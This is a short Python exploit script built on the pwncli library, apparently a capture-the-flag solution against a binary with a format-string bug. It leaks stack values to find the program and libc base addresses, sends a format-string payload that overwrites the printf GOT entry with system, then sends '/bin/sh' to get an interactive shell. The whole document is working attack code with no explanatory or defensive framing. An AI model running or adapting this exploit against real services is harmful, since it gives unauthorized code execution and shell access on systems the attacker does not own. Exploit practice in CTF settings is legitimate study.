from pwncli import *

cli_script()

p = gift['io']
e = gift['elf']

if gift['debug']:
    libc = gift['libc']
else:
    libc = ELF("/root/LibcSearcher/libc-database/other_libc_so/libc-2.23.so")


p.sendline("%41$p,%43$p")
msg = p.recvline()

code_addr, libc_addr = msg.split(b",")
code_base_addr = int16(code_addr.decode()) - e.sym['main'] - 74
libc_base_addr = int16(libc_addr.decode()) - libc.sym['__libc_start_main'] - 240

e.address = code_base_addr
libc.address = libc_base_addr

log_address("code_base_addr", code_base_addr)

payload = fmtstr_payload(offset=6, writes={e.got['printf']:libc.sym['system']}, write_size="short", write_size_max="short")

p.sendline(payload)

sleep(1)

p.sendline("/bin/sh")

p.interactive()